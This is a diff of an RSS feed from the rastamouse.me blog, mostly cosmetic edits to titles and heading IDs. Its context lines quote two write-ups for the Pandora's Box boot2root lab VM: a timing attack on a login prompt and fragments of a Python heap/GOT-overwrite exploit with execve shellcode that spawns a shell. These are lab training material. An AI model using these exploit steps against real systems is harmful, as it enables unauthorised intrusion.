@@ -1,12 +1,11 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Pandora&#39;s box on rastamouse.me</title>
-    <link>https://rastamouse.me/tags/pandoras-box/</link>
-    <description>Recent content in Pandora&#39;s box on rastamouse.me</description>
+    <title>pandoras-box on rastamouse.me</title>
+    <link>https://rastamouse.me/tags/pandoras-box/index.xml</link>
+    <description>Recent content in pandoras-box on rastamouse.me</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sun, 15 Mar 2015 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://rastamouse.me/tags/pandoras-box/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
@@ -15,9 +14,9 @@
       <pubDate>Sun, 15 Mar 2015 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2015/pandoras-box-1-level-1/</guid>
-      <description>
+      <description>&lt;p&gt;After completing &lt;a href=&#34;https://rastamouse.me/blog/2015/pandoras-box-1-level-0/&#34;&gt;Level 0&lt;/a&gt;, I echo&amp;rsquo;d my public key into &lt;code&gt;authorized_keys&lt;/code&gt; to allow for easy access.  So the first thing to do is check out level1&amp;rsquo;s home directory.&lt;/p&gt;
 
-&lt;p&gt;After completing &lt;a href=&#34;https://rastamouse.me/blog/2015/pandoras-box-1-level-0/&#34;&gt;Level 0&lt;/a&gt;, I echo&amp;rsquo;d my public key into &lt;code&gt;authorized_keys&lt;/code&gt; to allow for easy access.  So the first thing to do is check out level1&amp;rsquo;s home directory.&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level1@pb0x:~$ ls -l
 
@@ -57,7 +56,7 @@ Command list:
 
 &lt;p&gt;So fairly obviously, this is an application which is capable of creating, recalling and removing notes.&lt;/p&gt;
 
-&lt;h2 id=&#34;some-analysis:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Some Analysis&lt;/h2&gt;
+&lt;h2 id=&#34;some-analysis&#34;&gt;Some Analysis&lt;/h2&gt;
 
 &lt;p&gt;I uploaded peda and started to analyse the binary.&lt;/p&gt;
 
@@ -140,7 +139,7 @@ Breakpoint 1, 0x0804887d in create_struct ()
 0x087fe000 0x087ff000 rwxp     [heap]
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;some-fuzzing:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Some Fuzzing&lt;/h2&gt;
+&lt;h2 id=&#34;some-fuzzing&#34;&gt;Some Fuzzing&lt;/h2&gt;
 
 &lt;p&gt;Whilst fuzzing around locally in GDB, I found that I could force a crash.&lt;/p&gt;
 
@@ -198,11 +197,11 @@ Stopped reason: SIGSEGV
 
 &lt;p&gt;But knowing the pointer for a note, I would be able to calculate the location of every other note on the heap, as they are a set &amp;lsquo;distance&amp;rsquo; from each other.  It means I can store shellcode in a note&amp;rsquo;s text portion (executable thanks to &lt;code&gt;mprotect&lt;/code&gt;) and jump there with a GOT overwrite&amp;hellip;&lt;/p&gt;
 
-&lt;h2 id=&#34;exploit:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Exploit&lt;/h2&gt;
+&lt;h2 id=&#34;exploit&#34;&gt;Exploit&lt;/h2&gt;
 
 &lt;p&gt;There are a few steps to this exploit, so I wanted to step through it bit-by-bit.&lt;/p&gt;
 
-&lt;h3 id=&#34;handling-comms:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Handling comms&lt;/h3&gt;
+&lt;h3 id=&#34;handling-comms&#34;&gt;Handling comms&lt;/h3&gt;
 
 &lt;p&gt;First, I wanted to set up a function for sending and receiving data, because it&amp;rsquo;s a complete PITA to keep having to do &lt;code&gt;s.recv&lt;/code&gt; all the time.&lt;/p&gt;
 
@@ -227,7 +226,7 @@ Stopped reason: SIGSEGV
 
 &lt;p&gt;i.e. send nothing and receive data until the &lt;code&gt;&amp;gt;&lt;/code&gt; prompt is presented.&lt;/p&gt;
 
-&lt;h3 id=&#34;creating-notes:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Creating notes&lt;/h3&gt;
+&lt;h3 id=&#34;creating-notes&#34;&gt;Creating notes&lt;/h3&gt;
 
 &lt;p&gt;I&amp;rsquo;m going to use 3 notes to carry out this exploit, I tried to do it in 2 but it didn&amp;rsquo;t seem to work.&lt;/p&gt;
 
@@ -236,7 +235,7 @@ comm(&#39;new&#39;, &#39;&amp;gt;&#39;)
 comm(&#39;new&#39;, &#39;&amp;gt;&#39;)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h3 id=&#34;set-note-0:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Set note 0&lt;/h3&gt;
+&lt;h3 id=&#34;set-note-0&#34;&gt;Set note 0&lt;/h3&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;comm(&#39;set&#39;, &#39;id&#39;)
 comm(&#39;0&#39;, &#39;text&#39;)
@@ -245,7 +244,7 @@ comm(buffer, &#39;&amp;gt;&#39;)
 
 &lt;p&gt;where &lt;code&gt;buffer = &#39;A&#39; * 76&lt;/code&gt;&lt;/p&gt;
 
-&lt;h3 id=&#34;leak-the-pointer-of-note-1:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Leak the pointer of note 1&lt;/h3&gt;
+&lt;h3 id=&#34;leak-the-pointer-of-note-1&#34;&gt;Leak the pointer of note 1&lt;/h3&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;comm(&#39;show&#39;, &#39;id&#39;)
 s.send(&#39;0\n&#39;)
@@ -266,7 +265,7 @@ address = struct.unpack(&#39;I&#39;, data[93:97])[0]
 
 &lt;p&gt;If we print this in hex, it will come out something like &lt;code&gt;print hex(address)&lt;/code&gt; &amp;gt;&amp;gt; &lt;code&gt;0x9e69070&lt;/code&gt;&lt;/p&gt;
 
-&lt;h3 id=&#34;write-shellcode-into-note-2:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Write shellcode into note 2&lt;/h3&gt;
+&lt;h3 id=&#34;write-shellcode-into-note-2&#34;&gt;Write shellcode into note 2&lt;/h3&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;comm(&#39;set&#39;, &#39;id&#39;)
 comm(&#39;2&#39;, &#39;text&#39;)
@@ -280,7 +279,7 @@ comm(shellcode, &#39;&amp;gt;&#39;)
 
 &lt;p&gt;This is &lt;code&gt;execve&lt;/code&gt; shellcode from &lt;a href=&#34;http://shell-storm.org/shellcode/files/shellcode-575.php&#34;&gt;Shellstorm&lt;/a&gt;.&lt;/p&gt;
 
-&lt;h3 id=&#34;write-printf-into-note-1-pointer:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Write printf into note 1 pointer&lt;/h3&gt;
+&lt;h3 id=&#34;write-printf-into-note-1-pointer&#34;&gt;Write printf into note 1 pointer&lt;/h3&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;comm(&#39;set&#39;, &#39;id&#39;)
 comm(&#39;0&#39;, &#39;text&#39;)
@@ -289,7 +288,7 @@ comm(buffer + printf, &#39;&amp;gt;&#39;)
 
 &lt;p&gt;where &lt;code&gt;printf = &#39;\x70\xa3\x04\x08&#39;&lt;/code&gt; from &lt;code&gt;level1@pb0x:~$ objdump -R level2&lt;/code&gt;.&lt;/p&gt;
 
-&lt;h3 id=&#34;trigger-the-overwrite:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Trigger the overwrite&lt;/h3&gt;
+&lt;h3 id=&#34;trigger-the-overwrite&#34;&gt;Trigger the overwrite&lt;/h3&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;comm(&#39;set&#39;, &#39;id&#39;)
 comm(&#39;1&#39;, &#39;text&#39;)
@@ -312,7 +311,7 @@ s.send(payload + &#39;\n&#39;)
 &lt;li&gt;Length field = 4 bytes&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h3 id=&#34;handle-the-shell-commands:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Handle the shell commands&lt;/h3&gt;
+&lt;h3 id=&#34;handle-the-shell-commands&#34;&gt;Handle the shell commands&lt;/h3&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;while True:
         cmd = raw_input(&#39;# &#39;)
@@ -320,7 +319,7 @@ s.send(payload + &#39;\n&#39;)
         sys.stdout.write(s.recv(10240))
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;putting-it-together:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Putting it together!&lt;/h2&gt;
+&lt;h2 id=&#34;putting-it-together&#34;&gt;Putting it together!&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
 
@@ -398,8 +397,7 @@ while True:
 uid=1001(level1) gid=1001(level1) euid=1002(level2) groups=1002(level2),1001(level1)
 # whoami
 level2
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
     <item>
@@ -408,13 +406,13 @@ level2
       <pubDate>Mon, 05 Jan 2015 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2015/pandoras-box-1-level-0/</guid>
-      <description>
+      <description>&lt;p&gt;&lt;a href=&#34;https://www.vulnhub.com/entry/pandoras-box-1,111/&#34;&gt;Pandora&amp;rsquo;s Box&lt;/a&gt; is a boot2root VM written by c0ne.  It focuses on binary exploitation and reverse engineering. You have to complete all 5 levels to root the box.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&#34;https://www.vulnhub.com/entry/pandoras-box-1,111/&#34;&gt;Pandora&amp;rsquo;s Box&lt;/a&gt; is a boot2root VM written by c0ne.  It focuses on binary exploitation and reverse engineering. You have to complete all 5 levels to root the box.&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
 &lt;p&gt;The binaries in this challenge are absolutely exquisite and extrememly well put together.  I wanted to do rather comprehensive write-up&amp;rsquo;s for each binary, which would mean a *very* long article.  For this reason, I decided to publish each level as a separate blog post.&lt;/p&gt;
 
-&lt;h2 id=&#34;nmap:bb74457da9a065146c47e6672442f77c&#34;&gt;Nmap&lt;/h2&gt;
+&lt;h2 id=&#34;nmap&#34;&gt;Nmap&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/vulnhub/pbox/level_0# nmap -n -sS -p- 192.168.56.103
 
@@ -423,7 +421,7 @@ PORT      STATE SERVICE
 54311/tcp open  unknown
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;secure-remote-shell:bb74457da9a065146c47e6672442f77c&#34;&gt;Secure Remote Shell&lt;/h2&gt;
+&lt;h2 id=&#34;secure-remote-shell&#34;&gt;Secure Remote Shell&lt;/h2&gt;
 
 &lt;p&gt;The service on port &lt;code&gt;54311&lt;/code&gt; can be connected to using &lt;code&gt;netcat&lt;/code&gt;.&lt;/p&gt;
 
@@ -465,7 +463,7 @@ Password:
 
 &lt;p&gt;I did write a python script that would attempt passwords from the &lt;code&gt;rockyou&lt;/code&gt; wordlist but nothing popped, and if the password was of any significant length a straight &lt;code&gt;AAAA - ZZZZ&lt;/code&gt; bruteforce would take too long.&lt;/p&gt;
 
-&lt;h2 id=&#34;time-based-attack:bb74457da9a065146c47e6672442f77c&#34;&gt;Time Based Attack&lt;/h2&gt;
+&lt;h2 id=&#34;time-based-attack&#34;&gt;Time Based Attack&lt;/h2&gt;
 
 &lt;p&gt;If you send keystrokes manually, you can see there is a difference in the amount of *time* it takes for the binary to return &lt;code&gt;Invalid password!&lt;/code&gt;.  The longer the string, the more pronounced the difference is.&lt;/p&gt;
 
@@ -636,8 +634,7 @@ Logged in successfully, type exit to close the shell
 Shell$ id; whoami
 uid=1001(level_0) gid=1001(level_0) groups=1001(level_0)
 level_0
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
   </channel>
